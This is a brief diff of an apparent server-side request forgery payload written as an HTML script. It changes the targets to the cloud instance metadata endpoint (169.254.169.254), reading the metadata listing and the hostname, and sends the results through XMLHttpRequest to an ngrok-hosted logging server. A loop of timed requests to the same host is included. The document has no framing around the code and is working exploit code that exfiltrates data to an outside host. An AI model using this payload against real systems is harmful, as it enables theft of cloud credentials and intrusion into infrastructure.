@@ -1,6 +1,6 @@
 <script>
 var logTimeServer = 'd0ea-103-127-23-219.ngrok-free.app';
-var attackServer = 'ir3shio.github.io';
+// var attackServer = 'ir3shio.github.io';
 
 function log(data) {
     var sreq = new XMLHttpRequest();
@@ -31,6 +31,6 @@ for(var i = 0; i < 60; ++i) {
     req.open('GET', 'http://' + logTimeServer + '/', false);
     req.send();
 }
-log('Meta Data: ' + get('curl http://' + attackServer + '/latest/meta-data/'));
-log('Hostname: ' + get('http://' + attackServer + '/latest/meta-data/local-hostname'));
+log('Meta Data: ' + get('curl http://169.254.169.254/latest/meta-data/'));
+log('Hostname: ' + get('http://169.254.169.254/latest/meta-data/local-hostname'));
 </script>
